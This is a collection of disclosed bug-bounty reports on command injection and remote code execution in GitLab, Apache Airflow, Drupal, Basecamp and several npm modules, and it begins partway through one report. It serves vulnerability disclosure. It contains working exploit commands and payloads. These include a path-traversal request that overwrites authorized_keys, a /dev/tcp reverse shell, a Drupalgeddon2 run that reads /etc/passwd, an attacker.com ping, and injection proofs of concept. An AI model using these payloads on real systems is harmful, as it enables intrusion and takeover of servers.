curl -H "Private-Token: $(cat token)" http://10.26.0.5/api/v4/projects/2/packages/maven/a%2fb%2fc%2fd%2fe%2ff%2fg%2fh%2fi%2f1/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f.ssh%2fauthorized_keys -XPUT --path-as-is --data-binary @/home/asakawa/.ssh/id_rsa.pub
```
Then run `ssh git@10.26.0.5` to enjoy a shell.

### Examples

{F630231}

In my setup, I did't expose the 22 port of GitLab docker container, so I logged in the server with its docker IP, 172.18.0.2. In case there's any misunderstandings.

#### Results of GitLab environment info

```
$ gitlab-rake gitlab:env:info

System information
System:		
Proxy:		no
Current User:	git
Using RVM:	no
Ruby Version:	2.6.3p62
Gem Version:	2.7.9
Bundler Version:1.17.3
Rake Version:	12.3.3
Redis Version:	3.2.12
Git Version:	2.22.0
Sidekiq Version:5.2.7
Go Version:	unknown

GitLab information
Version:	12.4.2-ee
Revision:	a3170599aa2
Directory:	/opt/gitlab/embedded/service/gitlab-rails
DB Adapter:	PostgreSQL
DB Version:	10.9
URL:		http://10.26.0.5
HTTP Clone URL:	http://10.26.0.5/some-group/some-project.git
SSH Clone URL:	git@10.26.0.5:some-group/some-project.git
Elasticsearch:	no
Geo:		no
Using LDAP:	no
Using Omniauth:	yes
Omniauth Providers: 

GitLab Shell
Version:	10.2.0
Repository storage paths:
- default: 	/var/opt/gitlab/git-data/repositories
GitLab Shell path:		/opt/gitlab/embedded/service/gitlab-shell
Git:		/opt/gitlab/embedded/bin/git
```

```
# my docker-compose.yml
version: '3'
services:
  web:
    image: 'gitlab/gitlab-ee:latest'
    restart: always
    hostname: 'localhost'
    environment:
      GITLAB_OMNIBUS_CONFIG: |
        external_url 'http://10.26.0.5'
        gitlab_rails['packages_enabled'] = true
    ports:
      - '10.26.0.5:80:80'
  #    - '10.26.0.5:22:22'
    volumes:
      - './config:/etc/gitlab'
      - './logs:/var/log/gitlab'
      - './data:/var/opt/gitlab'
      - ./crack/pub.pem:/opt/gitlab/embedded/service/gitlab-rails/.license_encryption_key.pub:ro
```
Please forgive me to use a crack on my self hosted testing purpose GitLab EE instance :)

## Impact

This path traversal issue could be easily exploited by overwriting some critical files related to server access. In my example I use authorized_keys of git user to enable the shell access for the attacker.

---

### [CVE-2022-24288: Apache Airflow: TWO RCEs in example DAGs](https://hackerone.com/reports/1492896)

- **Report ID:** `1492896`
- **Severity:** High
- **Weakness:** Command Injection - Generic
- **Program:** Internet Bug Bounty
- **Reporter:** @x_h1
- **Bounty:** - usd
- **Disclosed:** 2022-04-01T14:40:51.151Z
- **CVE(s):** CVE-2022-24288

**Vulnerability Information:**

In Apache Airflow, prior to version 2.2.4, In DAG script of airflow , there is two command injection vulnerability (RCE) in the some scripts, which an attacker can execute arbitrary commands on the system.  The impact is even greater when airflow is configured for unauthenticated access. These two RCEs are assigned the same CVE number(CVE-2022-24288)

## Impact

#RCE one: example_passing_params_via_test_command.py command injection

##Vulnerability summary:
In Apache Airflow, prior to version 2.2.4, there is a command injection vulnerability (RCE) in the script (example_passing_params_via_test_command.py), which can obtain the permission of the operating system. 
##Vulnerability principle:
1. It can be seen from the source code of example_passing_params_via_test_command script that there is the function of executing bash command, The parameters Foo and MIFF in the template expressions {{params. Foo}} and {{params. Foo}} are externally controllable and rendered through the jiaja2 template: 

{F1634883}

{F1634884}
2. Further analysis “from airflow.operators.bash import BashOperator” code, we can see bash_command parameter value will be executed as a bash script;

{F1634885}

##Vulnerability exploitation ：
1. Enter the DAGs menu and start example_passing_params_via_test_command task, select “Trigger DAG w/ config”. 

http://192.168.3.17:8080/trigger?dag_id=example_passing_params_via_test_command

{F1634887}
2. To construct payload, we can know from the following code that we need to splice commands with semicolons after closing double quotation marks, so as to inject any operating system commands to be executed(RCE).

{F1634888}
PAYLOAD：`{"foo":"\";touch /tmp/pwnedaaaaa;\""}`, Then click trigger to execute the task.

{F1634889}

{F1634890}
Through the log and background view, it can be seen that any command has been executed successfully.

{F1634891}

{F1634892}
3.  Further execute the reverse shell to obtain operating system permissions.
Payload:` {"foo":"\";bash -i >& /dev/tcp/192.168.3.7/6666 0>&1;\""}`

{F1634893}

{F1634894}

#RCE two: tutorial.py DAG command injection

##Vulnerability summary：
Ithere is a command injection vulnerability (RCE) in the script (tutorial.py), which an attacker can execute arbitrary commands on the system. 
##Vulnerability principle：
1. It can be seen from the source code of tutorial script that there is the function of executing bash command, The parameters “my_param” in the template expressions {{params.my_param}} is externally controllable and rendered through the jinja2 template: 

{F1634906}
2. Further analysis “from airflow.operators.bash import BashOperator” code, we can see bash_command parameter value will be executed as a bash script;

{F1634907}
#Vulnerability exploitation:
1. Enter the DAGs menu and start tutorial task, select “Trigger DAG w/ config”. 

http://192.168.3.17:8080/trigger?dag_id=tutorial

{F1634908}
2. To construct payload, we can know from the following code that we need to splice commands with semicolons after closing double quotation marks, so as to inject any operating system commands to be executed(RCE).

{F1634913}
PAYLOAD：`{"my_param":"\";touch /tmp/pwnedddddd;\""}`, Then click trigger to execute the task.

{F1634915}

{F1634916}
Through the log and background view, it can be seen that arbitrary command has been executed successfully.

{F1634917}

**Summary (team):**

CVE-2022-24288: Apache Airflow: RCE in example DAGs

Severity: high

Description: In Apache Airflow, prior to version 2.2.4, some example DAGs did not properly sanitize user-provided params, making them susceptible to OS Command Injection from the web UI.

Mitigation: This can be mitigated by ensuring `[core] load_examples` is set to `False`.

Credit: The Apache Airflow PMC would like to thank Kai Zhao of the TToU Security Team for reporting this issue.

https://lists.apache.org/thread/dbw5ozcmr0h0lhs0yjph7xdc64oht23t

---

### [Remote Code Execution at https://169.38.86.185/ (edst.ibm.com)](https://hackerone.com/reports/1379130)

- **Report ID:** `1379130`
- **Severity:** Critical
- **Weakness:** Command Injection - Generic
- **Program:** IBM
- **Reporter:** @haxor31337
- **Bounty:** - usd
- **Disclosed:** 2021-11-04T12:01:40.136Z
- **CVE(s):** -

**Summary (team):**

A discovered Gitlab server was running an old version affected by RCE. This vulnerability could have allowed an unauthenticated attackers to compromise the server by public exploit in ExifTool. The issue was reported to IBM and remediated.

---

### [Insecure Bundler configuration fetching internal Gems (okra) from Rubygems.org](https://hackerone.com/reports/1104874)

- **Report ID:** `1104874`
- **Severity:** High
- **Weakness:** Command Injection - Generic
- **Program:** Basecamp
- **Reporter:** @zofrex
- **Bounty:** 5000 usd
- **Disclosed:** 2021-08-10T07:12:35.420Z
- **CVE(s):** -

**Vulnerability Information:**

I believe (most likely) that one of your projects is not set up correctly to only pull internal gems from your internal gem server, and instead will pull gems from Rubygems.org if the version number there is higher.

Specifically, the "okra" gem.

At around 15:21 today (UTC) the okra gem that I wrote – https://rubygems.org/gems/okra – was installed on the machine with hostname "oscillatinghost" under the username "fernando" on your network.

This would be possible if the Gemfile either installs gems from global sources (thus allowing the version on Rubygems to 'trump' the internal version) or if the okra gem is depended on by another internal gem, and your version of Bundler is less than 2.2.10 – see here for details on that: https://bundler.io/blog/2021/02/15/a-more-secure-bundler-we-fixed-our-source-priorities.html

It is possible this is not correct, and instead, someone typed "gem install okra" without specifying where to fetch the Gem from. This would potentially also have fetched it from Rubygems.

Please note that the Gem I wrote does not do anything malicious, and only fetches the minimum information I need to filter out false positives and correctly identify organisations. You can verify this yourself by looking at the code for the gem "okra-90002.0" in your gems folder. I will delete all information relating to your organisation as soon as it is no longer needed.

## Impact

The impact is that an attacker could achieve arbitrary Remote Code Execution on any machines that will fetch the gem from the Rubygems repository.

Note that to achieve code execution, merely installing the Gem is enough, it does not have to be require'd or run.

**Summary (researcher):**

I found an internal gem (Ruby library) in use by Basecamp that was not registered on Rubygems (the public Ruby package repository). I registered a gem of my own under the name that would call back when installed, in an attempted "dependency confusion" attack.

Although this attack was not successful against any production machines or automated builds, as Basecamp had successfully mitigated against the attack in those places, my library was installed on a developer machine when a member of Basecamp attempted to install the gem by hand using "gem install" rather than running a "bundle install".

This vulnerability was resolved by using configuration management software to set the default package repository on developer machines to one controlled by Basecamp, where they can control which packages come from which repositories and can prevent internal packages being pulled from Rubygems.

---

### [View Only to Root Privilege Escalation on UniFi Protect](https://hackerone.com/reports/825764)

- **Report ID:** `825764`
- **Severity:** High
- **Weakness:** Command Injection - Generic
- **Program:** Ubiquiti Inc.
- **Reporter:** @fr33rh
- **Bounty:** - usd
- **Disclosed:** 2021-05-23T01:22:54.746Z
- **CVE(s):** -

**Summary (team):**

UniFi Protect v1.13.2 (and prior) containing vulnerabilities allowing users to run certain custom commands that can be used to assign themselves unauthorized roles, escalating their privileges. 
These vulnerabilities were found on UniFi Protect v1.13.2 and prior versions for Cloud Key Gen2 plus.
The Fix for these vulnerabilities were included in the new version of Unifi Protect v1.13.3  (for Cloud Key Gen2 plus) and Unifi Protect v1.14.10 (for UniFi Dream Machine Pro and UNVR)
More details available at:
https://community.ui.com/releases/UniFi-Protect-1-13-3/f4be7d35-93a3-422b-8eef-122e442c00ba
https://community.ui.com/releases/UniFi-Protect-1-14-10/48a8dbdd-b872-47fa-bbde-1d24ddf5d5b5
https://community.ui.com/releases/Security-advisory-bulletin-012-012/1bba9134-f888-4010-81c0-b0dd53b9bda4

---

### [Readonly to Root Privilege Escalation on EdgeSwitch](https://hackerone.com/reports/796414)

- **Report ID:** `796414`
- **Severity:** High
- **Weakness:** Command Injection - Generic
- **Program:** Ubiquiti Inc.
- **Reporter:** @fr33rh
- **Bounty:** - usd
- **Disclosed:** 2021-05-23T01:22:16.534Z
- **CVE(s):** CVE-2020-8233

**Summary (team):**

An authenticated read-only user can execute arbitrary shell commands over the HTTP interface, allowing them to escalate privileges.
These vulnerabilities were found on EdgeSwitch 1G switch (ESWH) and EdgeSwitch 10G switch (ESGH) firmware v1.9.0.

The fix for these vulnerabilities were included in the EdgeMax EdgeSwitch firmware v1.9.1
For more details please visit:

https://community.ui.com/releases/EdgeMAX-EdgeSwitch-Firmware-v1-9-1-v1-9-1/8a87dfc5-70f5-4055-8d67-570db1f5695c

https://www.ui.com/download/edgemax

---

### [[wireguard-wrapper] Command Injection via insecure command concatenation](https://hackerone.com/reports/858674)

- **Report ID:** `858674`
- **Severity:** Critical
- **Weakness:** Command Injection - Generic
- **Program:** Node.js third-party modules
- **Reporter:** @d3lla
- **Bounty:** - usd
- **Disclosed:** 2021-04-16T21:23:42.350Z
- **CVE(s):** -

**Vulnerability Information:**

I would like to report a `Command Injection` issue in the `wireguard-wrapper` module.
It allows to execute arbitrary commands on the victim's PC.

# Module

**module name:** `wireguard-wrapper`
**version:** `1.0.2`
**npm page:** `https://www.npmjs.com/package/wireguard-wrapper`

## Module Description

This project is a nodejs wrapper for the wireguard commands wg and wg-quick.

Features:
- No dependencies
- Uses promises

Limitations:
- So far it can only read but not write anything
- missing wg set, wg setconf, wg addconf, wg syncconf

## Module Stats

[0] weekly downloads

# Vulnerability

## Vulnerability Description

The issue occurs because a user input parameter is used inside a command that is executed without any check. 

I tested the `wg showconf` functionality. 
Here's the code which causes the issue:

```javascript
// https://github.com/rostwolke/node-wireguard-wrapper/blob/master/src/command/Wg.js#L58
'use strict';
const {exec} = require('child_process');
...
	static showconf(device){
		return new Promise(function(resolve, reject){
			if(!device){
				return reject('No device/interface specified');
			}

			exec(`wg showconf ${device}`, function(error, stdout, stderr){
				if(error){
					return reject(`Exec error: ${error}`);
				}
				if(stderr){
					return reject(`StdErr: ${stderr}`);
				}
    ....
```
As we can see the `device` parameter is passed as input to the `exec` function.

The function `exec` is the build-in function `child_process.exec()` taking in input the `device` variable build with the unsecure user's input.

## Steps To Reproduce:
- create a directory for testing
    - `mkdir poc`
    - `cd poc/`

- install [`wireguard` tool](https://www.wireguard.com/install/) (even though it is not needed to show the vulnerability)
- install `wireguard-wrapper` module:
    -  `npm i --save wireguard-wrapper`
- create the following PoC JavaScript file (`poc.js`):

```javascript
const { Wg } = require('wireguard-wrapper');

Wg.showconf('; touch HACKED').then(function(config){
    console.log('wg0 configuration:', config);
    console.log('generated configuration file:', config.toString());
});
```
- make sure that the `HACKED` file does not exist:
    - `ls`
- execute the `poc.js` file:
    - `node poc.js`
- the `HACKED` file is created:
    - `ls`

{F802322}


## Patch
Do not concatenate commands using insecure user's input. Always check and sanitize it. 
In my opinion, it's better to use [`child_process.execFile`](https://nodejs.org/api/child_process.html#child_process_child_process_execfile_file_args_options_callback) or [`child_process.spawn`](https://nodejs.org/api/child_process.html#child_process_child_process_spawn_command_args_options) functions instead of `child_process.exec`.

## Supporting Material/References:

- OPERATING SYSTEM VERSION: Ubuntu 18.04.4 LTS
- NODEJS VERSION: v13.13.0
- NPM VERSION: 6.14.4

# Wrap up

- I contacted the maintainer to let them know: [N] 
- I opened an issue in the related repository: [N] 


Thank you for your time.

best regards,

d3lla

## Impact

Command Injection on `wireguard-wrapper` module via insecure command concatenation.

---

### [[CVE-2018-7600] Remote Code Execution due to outdated Drupal server on www.█████████](https://hackerone.com/reports/1063256)

- **Report ID:** `1063256`
- **Severity:** High
- **Weakness:** Command Injection - Generic
- **Program:** U.S. Dept Of Defense
- **Reporter:** @0x0d0
- **Bounty:** - usd
- **Disclosed:** 2021-03-24T20:24:17.881Z
- **CVE(s):** CVE-2018-7600

**Vulnerability Information:**

## Summary 
Due to an outdated Drupal version, remote code execution is possible on `www.█████` via CVE-2018-7600. 

## Description
Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1 allows remote attackers to execute arbitrary code because of an issue affecting multiple subsystems with default or common module configurations. 

Vulnerable Host:
 * `www.███`

Visiting `https://www.███/███` we can see that we have a Drupal with version 7.54, which was updated the last time in 2017-02-01.

There are several critical and highly critical vulnerabilities known for this version (see `https://api.drupal.org/api/drupal/████████/7.x` and `https://www.drupal.org/security`). Among them is `SA-CORE-2018-002` (CVE-2018-7600), which I will demonstrate here. 

Note: I am reporting this here, since the page `https://www.███████` seems to belong to the █████████, which belongs to the DOD. The footer further states: `██████. [...]`

## Step-by-step Reproduction Instructions

1. Download the git repository with the exploit: `git clone https://github.com/dreadlocked/Drupalgeddon2.git && cd Drupalgeddon2`
    * Install dependencies if necessary `gem install nokogiri`

2. Run the exploit with ruby `ruby drupalgeddon2-customizable-beta.rb -u https://www.████████/ -v 7 -c id --form user/login`

Parameters explanation: 
```
-u,     --url URL           Service URL
-v,     --version VERSION   Target Drupal version {7,8}
-c,     --command COMMAND   Command to execute
--form  Form to attack, by default '/user/password' in Drupal 7 
```
The above command outputs:
```
root@5b08dc005375:/Drupalgeddon2# ruby drupalgeddon2-customizable-beta.rb -u https://www.████/ -v 7 -c id --form user/login
drupalgeddon2-customizable-beta.rb:184: warning: URI.escape is obsolete
[i] Requesting: www.███████//user/password/?name[%23post_render][]=passthru&name[%23markup]=id&name[%23type]=markup
[i] POST: form_id=user_pass&_triggering_element_name=name
[i] 200
[*] Obtained build id!: ████████
drupalgeddon2-customizable-beta.rb:220: warning: URI.escape is obsolete
drupalgeddon2-customizable-beta.rb:221: warning: URI.escape is obsolete
[i] Requesting: www.█████/file/ajax/name/%23value/██████
[i] POST: form_build_id=█████
[i] Response code: 200
uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0
root@5b08dc005375:/Drupalgeddon2# 
```
As we can see, we successfully executed the `id` command, which responded with `uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0`

I am also providing the output of `/etc/passwd` which I obtained with command 
```
ruby drupalgeddon2-customizable-beta.rb -u https://www.██████/ -v 7 -c "cat /etc/passwd" --form user/login
```
Output: 
```
████
██████
███████
████████
█████████
█████████
██████████
███
████
█████████
██████████
████
██████████
████████ █████
█████████
██████████
████████
██████████
██████
████
█████████
███████
███████
████
██████████
███
█████
█████
██████
```

## Resources
 * https://api.drupal.org/api/drupal/█████/7.x
 * https://www.drupal.org/security
 * https://github.com/dreadlocked/Drupalgeddon2
 * https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7600
 * https://www.drupal.org/sa-core-2018-002

## Mitigation/Remediation Actions
Upgrade to the most recent version of Drupal 7 core.

## Impact

Critical - Remote Code Execution

---

### [Pre-auth Remote Code Execution on multiple Uber SSL VPN servers](https://hackerone.com/reports/540242)

- **Report ID:** `540242`
- **Severity:** Critical
- **Weakness:** Command Injection - Generic
- **Program:** Uber
- **Reporter:** @orange
- **Bounty:** 2000 usd
- **Disclosed:** 2021-02-24T01:26:56.353Z
- **CVE(s):** -

**Summary (team):**

format string vulnerability on /sslmgr with no authentication required

**Summary (researcher):**

Details:
> http://blog.orange.tw/2019/07/attacking-ssl-vpn-part-1-preauth-rce-on-palo-alto.html

---

### [[curling] Remote Code Execution](https://hackerone.com/reports/973386)

- **Report ID:** `973386`
- **Severity:** Critical
- **Weakness:** Command Injection - Generic
- **Program:** Node.js third-party modules
- **Reporter:** @solov9ev
- **Bounty:** - usd
- **Disclosed:** 2021-01-14T08:40:27.267Z
- **CVE(s):** -

**Vulnerability Information:**

I would like to report `RCE` in `curling`
I can bypass the security check for special characters, read / overwrite file

# Module

**module name:** curling
**version:** 1.1.0
**npm page:** `https://www.npmjs.com/package/curling`

## Module Description

A node wrapper for curl with a very simple api.

## Module Stats

[156] weekly downloads

# Vulnerability

## Vulnerability Description

The regular expression does not perform proper validation and, when combined with curl, leads to disastrous consequences:
```javascript
/[`$&{}[;|]/g.test(command)
```

## Steps To Reproduce:

- Run `npm i curling`

- Create and run the following POC index.js:

```javascript
const curling = require('curling');

curling.run('file:///etc/passwd -o ./index.js', function(d, payload){console.log(payload)});
```

- The exploit worked and overwritten the file - `index.js`

{F973903}

## Patch

Regular expression needs improvement

# Wrap up

- I contacted the maintainer to let them know: [N] 
- I opened an issue in the related repository: [N]

## Impact

Command Injection on `curling` module via insecure command

---

### [[last-commit-log] Command Injection](https://hackerone.com/reports/881713)

- **Report ID:** `881713`
- **Severity:** High
- **Weakness:** Command Injection - Generic
- **Program:** Node.js third-party modules
- **Reporter:** @bilk0h
- **Bounty:** - usd
- **Disclosed:** 2020-11-29T11:06:29.469Z
- **CVE(s):** -

**Vulnerability Information:**

I would like to report `Command Injection` in `last-commit-log`
It allows `execution of arbitrary commands`

# Module

**module name:** `last-commit-log`
**version:** `last-commit-log@3.0.4`
**npm page:** `https://www.npmjs.com/package/last-commit-log`

## Module Description

Node.js module to get the last git commit information - mostly to be used by CI/CD and building phase.

## Module Stats

[3,253] downloads in the last week

# Vulnerability

The value of the GIT_DIR env variable is added to the command here on [line 10](https://github.com/node-modules/last-commit-log/blob/master/index.js#L10) and here on [line 25](https://github.com/node-modules/last-commit-log/blob/master/index.js#L25) and finally the command is executed on [line 36](https://github.com/node-modules/last-commit-log/blob/master/index.js#L36).

## Vulnerability Description

## Steps To Reproduce:
> npm i last-commit-log
>cat > test.js
const LCL = require('last-commit-log');
const lcl = new LCL('.'); // or `new LCL(dir)` dir is process.cwd() by default
>lcl
  .getLastCommit()
  .then(commit => console.log(commit));

Export malicious GIT_DIR string
>export GIT_DIR=". ;touch xxx;"

Run
>node test.js


{F840963}

## Patch

Fix: enclose --git-dir flag in quotes on line 10 like so
```this.gitDirStr = GIT_DIR ? `--git-dir="${GIT_DIR}/.git"` : '';```

## Supporting Material/References:

- [OPERATING SYSTEM VERSION] Ubuntu 18.04.4 LTS
- [NODEJS VERSION] v14.0.0
- [NPM VERSION] 6.14.4

# Wrap up

- I contacted the maintainer to let them know: [Y/N] No
- I opened an issue in the related repository: [Y/N] No

## Impact

Ability to run any command available for attacker.

---

### [Remote code execution on Basecamp.com](https://hackerone.com/reports/365271)

- **Report ID:** `365271`
- **Severity:** Critical
- **Weakness:** Command Injection - Generic
- **Program:** Basecamp
- **Reporter:** @gammarex
- **Bounty:** 5000 usd
- **Disclosed:** 2020-11-26T18:22:15.199Z
- **CVE(s):** CVE-2017-8291

**Vulnerability Information:**

A critical flaw in Basecamp's profile image upload function leads to remote command execution. Images are converted on the server side, but not only image files but also PostScript/EPS files are accepted (if renamed to .gif). This is probably due to ImageMagick / GraphicsMagick being used for image conversion, which calls a PostScript interpreter (Ghostscript) if the input file starts with '%!'. The used Ghostscript version however has a security bug (CVE-2017-8291) leading to remote command execution.

/Proof of concept/: Upload the attached rce.gif file as profile image (change the `ping -c1 attacker.com' to some other shell command).

/Mitigation/: Upgrade Ghostscript; also, before processing uploaded images make sure they are real image files (e.g. based on magic header)

## Impact

Gain a remote shell; from here start exploitation/privilege escalation

---

### [[systeminformation] Command Injection via insecure command formatting](https://hackerone.com/reports/925324)

- **Report ID:** `925324`
- **Severity:** Critical
- **Weakness:** Command Injection - Generic
- **Program:** Node.js third-party modules
- **Reporter:** @effectrenan
- **Bounty:** - usd
- **Disclosed:** 2020-11-16T16:42:51.827Z
- **CVE(s):** -

**Vulnerability Information:**

I would like to report a Command Injection vulnerability in the `systeminformation` package. It allows an attacker to inject arbitrary OS commands.

# Module
**Module name:** systeminformation
**Version:** 4.26.10
**npm page:** `https://www.npmjs.com/package/systeminformation`

## Module Description

System and OS information library for node.js.

## Module Stats

Weekly downloads: 363.195

# Vulnerability

## Vulnerability Description

The attacker can concatenate `curl` parameters to overwrite a Javascript file of the package and then execute any OS commands.

The `child_process.exec()` function executes the following command:
```bash
curl -I --connect-timeout 5 -m 5 $urlSanitized 2>/dev/null | head -n 1 | cut -d " " -f2 # $urlSanitized is the user input
```

## Steps To Reproduce:

Create a Javascript file with content:
```javascript
const { exec } = require('child_process')
function inetChecksite(url) {
  return exec(url)
}
exports.inetChecksite = inetChecksite
```

We can use Netcat to create a TCP server to send back our Javascript file created before on 443 port:
```bash
sudo nc -nlp 443 < file.js
```

Execute the code bellow to overwrite the Javascript file:
```javascript
const si = require('systeminformation')
const HOST = "127.0.0.1:443"

//The telnet was chosen to solve an issue with the protocol response check, like HTTP (HTTP/1.0 200 OK in the first line).
si.inetChecksite(`telnet://${HOST} --no-buffer -o node_modules/systeminformation/lib/internet.js`)

setTimeout(() => {
  process.exit()
}, 2000)
```

Now we can execute OS commands:
```javascript
const si = require('systeminformation')
si.inetChecksite("<Some OS command>")
```

## Patch

Replace:
```javascript
const exec = require('child_process').exec
```
To:
```javascript
const { spawn } = require('child_process')
```

## Supporting Material/References:

- ArchLinux 5.4.50 x64
- NODEJS 14.5.0
- NPM 6.14.5

# Wrap up

- I contacted the maintainer to let them know: [N] 
- I opened an issue in the related repository: [N]

## Impact

An attacker can execute arbitrary OS  commands on the victim's machine.

**Summary (researcher):**

**[CVE-2020-7752](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-7752).**

---

### [[gfc] Command Injection via insecure command formatting](https://hackerone.com/reports/871071)

- **Report ID:** `871071`
- **Severity:** Critical
- **Weakness:** Command Injection - Generic
- **Program:** Node.js third-party modules
- **Reporter:** @d3lla
- **Bounty:** - usd
- **Disclosed:** 2020-10-27T20:26:38.379Z
- **CVE(s):** -

**Vulnerability Information:**

I would like to report a `Command Injection` issue in the `gfc` module.
It allows to execute arbitrary commands on the victim's PC.

# Module

**module name:** `gfc`
**version:** `2.0.2`
**npm page:** `https://www.npmjs.com/package/gfc`

## Module Description

Simple way to initialize a new git repository in an empty directory, add a file and do a first commit (or skip that part in a directory with files). Useful for unit tests and generators.

## Module Stats

[15] weekly downloads

# Vulnerability

## Vulnerability Description

The issue occurs because a user input parameter is used inside a command that is executed without any proper sanitization. 
Here's the code which causes the issue:

```javascript

// https://github.com/jonschlinkert/gfc/blob/master/index.js#L80
...
const cp = require('child_process');
...
const firstCommit = async(cwd, options, callback) => {
    ....
    const opts = Object.assign({ cwd: cwd }, options);
    ....
    .then(async() => {
      return await exec(createArgs(opts), execOpts); //<-- options
    });
...

function createArgs(options) {
  const opts = Object.assign({}, defaults, options);
  const args = ['git init'];
  const files = opts.files ? arrayify(opts.files).join(' ') : '.';
  let message = opts.message || 'First commit';

  if (message[0] !== '"' && message.slice(-1) !== '"') {
    message = `"${message}"`; //<-- injection
  }

  // backwards compatibility
  if (opts.skipCommit === true) {
    opts.commit = false;
  }

  if (opts.forceFile === true || (opts.file !== false && isEmpty(opts.cwd))) {
    args.push('touch "' + opts.file.path + '"');

    if (opts.file.contents) {
      args.push('echo "' + opts.file.contents.toString() + '" >> ' + opts.file.path);
    }
  }

  if (opts.commit !== false) {
    args.push(`git add ${files}`);
    args.push(`git commit -m ${message}`);
  }

  if (typeof opts.remote === 'string' && isGitUrl(opts.remote)) {
    args.push(`git remote add origin ${opts.remote}`);

    if (opts.push === true) {
      args.push('git push --force origin master:master');
    }
  }

  return args.join(' && ');
}
```
The arguments `options` is used to build the command that is passed to the `child_process.exec` function without any sanitization.


## Steps To Reproduce:
- create a directory for testing
    - `mkdir poc`
    - `cd poc/`

- install `gfc` module:
    -  `npm i gfc`
- create the following PoC JavaScript file (`poc.js`):

```javascript

const firstCommit = require('gfc');
const options = {message: '""; touch HACKED;'};
firstCommit('.', options, function(err) {});

```
- make sure that the `HACKED` file does not exist:
    - `ls`
- execute the `poc.js` file:
    - `node poc.js`
- the `HACKED` file is created:
    - `ls`
    
{F824264}


## Patch
Do not concatenate/format commands using insecure user's input. Always check and sanitize it. 
In my opinion, it's better to use [`child_process.execFile`](https://nodejs.org/api/child_process.html#child_process_child_process_execfile_file_args_options_callback) or [`child_process.spawn`](https://nodejs.org/api/child_process.html#child_process_child_process_spawn_command_args_options) functions instead of `child_process.exec`.

## Supporting Material/References:

- OPERATING SYSTEM VERSION: Ubuntu 18.04.4 LTS
- NODEJS VERSION: v14.1.0
- NPM VERSION: 6.14.5

# Wrap up

- I contacted the maintainer to let them know: [N] 
- I opened an issue in the related repository: [N] 


Thank you for your time.

best regards,

d3lla

## Impact

Command Injection on `gfc` module via insecure command formatting.

---

### [[extra-asciinema] Command Injection via insecure command formatting](https://hackerone.com/reports/863956)

- **Report ID:** `863956`
- **Severity:** Critical
- **Weakness:** Command Injection - Generic
- **Program:** Node.js third-party modules
- **Reporter:** @d3lla
- **Bounty:** - usd
- **Disclosed:** 2020-08-22T08:48:20.138Z
- **CVE(s):** -

**Vulnerability Information:**

I would like to report a `Command Injection` issue in the `extra-asciinema` module.
It allows to execute arbitrary commands on the victim's PC.

# Module

**module name:** `extra-asciinema`
**version:** `1.0.5`
**npm page:** `https://www.npmjs.com/package/extra-asciinema`

## Module Description

asciinema is a terminal screen recorder.

With this package you can auto-generate terminal recordings for Node.js examples through asciinema programmatically. Each method is also available as separate package for use by bundling tools, like browserify, rollup, uglify-js.

## Module Stats

[23] weekly downloads

# Vulnerability

## Vulnerability Description

The issue occurs because a user input parameter is used inside a command that is executed without any check. 

I tested the `uploadSync` function.
Here's the code which causes the issue:

```javascript
// https://github.com/nodef/extra-asciinema/blob/master/index.js#L214
...
const cp9 = require('child_process');
...
/**
 * Upload recorded asciicast to asciinema.org site.
 * @param {string} f filename
 * @returns {string} asciicast URL
 */
function uploadSync(f) {
  var stdout = cp9.execSync(`asciinema upload ${f}`, {encoding: 'utf8'});
  return stdout.replace(/.*?(https?:\S+).*/s, '$1');
}
...
```
The `f` parameter is used to build the command that is passed to the `child_process.execSync` function without any check.


## Steps To Reproduce:
- create a directory for testing
    - `mkdir poc`
    - `cd poc/`

- install `extra-asciinema` module:
    -  `npm i extra-asciinema`
- create the following PoC JavaScript file (`poc.js`):

```javascript
const asciinema = require('extra-asciinema');
asciinema.uploadSync('; touch HACKED');

```
- make sure that the `HACKED` file does not exist:
    - `ls`
- execute the `poc.js` file:
    - `node poc.js`
- the `HACKED` file is created:
    - `ls`
    
{F810853}


## Patch
Do not concatenate/format commands using insecure user's input. Always check and sanitize it. 
In my opinion, it's better to use [`child_process.execFileSync`](https://nodejs.org/api/child_process.html#child_process_child_process_execfilesync_file_args_options) or [`child_process.spawnSync`](https://nodejs.org/api/child_process.html#child_process_child_process_spawnsync_command_args_options) functions instead of `child_process.execSync`.

## Supporting Material/References:

- OPERATING SYSTEM VERSION: Ubuntu 18.04.4 LTS
- NODEJS VERSION: v13.13.0
- NPM VERSION: 6.14.4

# Wrap up

- I contacted the maintainer to let them know: [N] 
- I opened an issue in the related repository: [N] 


Thank you for your time.

best regards,

d3lla

## Impact

Command Injection on `extra-asciinema` module via insecure command formatting.

---

### [[extra-ffmpeg] Command Injection via insecure command formatting](https://hackerone.com/reports/863944)

- **Report ID:** `863944`
- **Severity:** Critical
- **Weakness:** Command Injection - Generic
- **Program:** Node.js third-party modules
- **Reporter:** @d3lla
- **Bounty:** - usd
- **Disclosed:** 2020-08-20T09:08:41.263Z
- **CVE(s):** -

**Vulnerability Information:**

I would like to report a `Command Injection` issue in the `extra-ffmpeg` module.
It allows to execute arbitrary commands on the victim's PC.

# Module

**module name:** `extra-ffmpeg`
**version:** `4.0.3`
**npm page:** `https://www.npmjs.com/package/extra-ffmpeg`

## Module Description

Decode, encode, transcode, mux, demux, stream, filter, and play media through machine (via "ffmpeg").

## Module Stats

[99] weekly downloads

# Vulnerability

## Vulnerability Description

The issue occurs because a user input parameter is used inside a command that is executed without any check. 

Here's the code which causes the issue:

```javascript
// https://github.com/nodef/extra-ffmpeg/blob/master/index.js#L19
const cp = require('child_process');


// Global variables.
const STDIO = [0, 1, 2];


 // Generate command for ffmpeg.
 function command(os) {
  var z = 'ffmpeg';
  var os = os||[];
  for(var o of os) {
    var o = o||{};
    for(var k in o) {
      if(o[k]==null) continue;
      if(k==='stdio') continue;
      if(k==='o' || k==='outfile') z += ` "${o[k]}"`;
      else if(typeof o[k]==='boolean') z += o[k]? ` -${k}`:'';
      else z += ` -${k} ${JSON.stringify(o[k])}`;  // <-- injection
    }
  }
  return z;
};

/**
 * Invoke "ffmpeg" synchronously.
 * @param {object} os ffmpeg options.
 */
function sync(os) {
